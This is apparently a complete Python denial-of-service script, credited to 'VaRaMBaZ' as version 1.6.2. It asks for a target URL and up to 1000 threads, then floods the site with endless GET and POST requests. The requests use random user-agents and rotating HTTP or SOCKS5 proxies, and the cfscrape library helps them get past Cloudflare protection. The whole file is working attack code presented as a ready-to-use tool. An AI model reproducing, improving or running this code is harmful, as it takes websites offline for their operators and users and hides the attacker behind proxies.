import colorama
import threading
import random
import requests
import cfscrape
import os

os.system("clear")

s = cfscrape.create_scraper()

with open('useragent') as file:
    headersp = ''.join(file.readlines()).strip().split('\n')

with open('proxyhttp') as file:
    proxy_http = ''.join(file.readlines()).strip().split('\n')

with open('proxysocks') as file:
    proxy_socks = ''.join(file.readlines()).strip().split('\n')

def dos1(target):
    while True:
        useragent = random.choice(headersp)
        header = {'user-agent': useragent}

        useragent2 = random.choice(headersp)
        header2 = {'user-agent': useragent2}

        proxyagenthttp = random.choice(proxy_http)
        proxieshttp = {
            'http': f'http://{proxyagenthttp}',
            'https': f'http://{proxyagenthttp}'
        }

        proxyagentsocks = random.choice(proxy_socks)
        proxiessocks = {
            'http': f'socks5://{proxyagentsocks}',
            'https': f'socks5://{proxyagentsocks}'
        }
        try:
            s.get(target, headers=header, proxies=proxieshttp)
            s.post(target, headers=header, proxies=proxieshttp)
            s.get(target, headers=header2, proxies=proxiessocks)
            s.post(target, headers=header2, proxies=proxiessocks)
        except:
            pass


def dos2(target):
    while True:
        useragent = random.choice(headersp)
        header = {'user-agent': useragent}
        try:
            requests.get(target, headers=header)
            requests.post(target, headers=header)
        except:
            pass


threads = 20
print("\\-\          //-/    //-/\\-\       ==========     ||====\-\   //=====\-\ ||======-\     ")
print(" \\-\        //-/    //-/  \\-\     ||-|     ||-|   ||    |=-|  ||     |-| || _____|-|    ")
print("  \\-\      //-/    //-/    \\-\    ||-|     ||-|   ||    |=-|  ||     |-| ||____             ")
print("   \\-\    //-/    //========\\-\   ||=========     ||    |=-|  ||     |-|      || |-|    ")
print("    \\-\  //-/    //-/        \\-\  ||-|     \\-\    ||    |=-|  ||     |-|   ___|| |-|   ")
print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/-/ ||======|-| \n")
print("Creator: VaRaMBaZ")
print("Version: 1.6.2; Improving the menu and optimizing the attack \n")


url = input("URL: ")
if not url.__contains__("http"):
    exit(colorama.Fore.RED + "URL doesnt contains http or https!")

if not url.__contains__("."):
    exit(colorama.Fore.RED + "Invalid domain")

try:
    threads = int(input("Threads[max 1000]: "))
except ValueError:
    exit(colorama.Fore.RED + "Threads count is incorrect!")

if threads == 0 or threads > 1000:
    exit(colorama.Fore.RED + "Threads count is incorrect!")

proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
print("")

print(colorama.Fore.YELLOW + "Starting threads...")
if (proxyuseage == 1):
    for i in range(0, threads):
        thr = threading.Thread(target=dos1, args=(url,))
        thr.start()
else:
    for i in range(0, threads):
        thr2 = threading.Thread(target=dos2, args=(url,))
        thr2.start()
print(colorama.Fore.GREEN + "All threads are running!")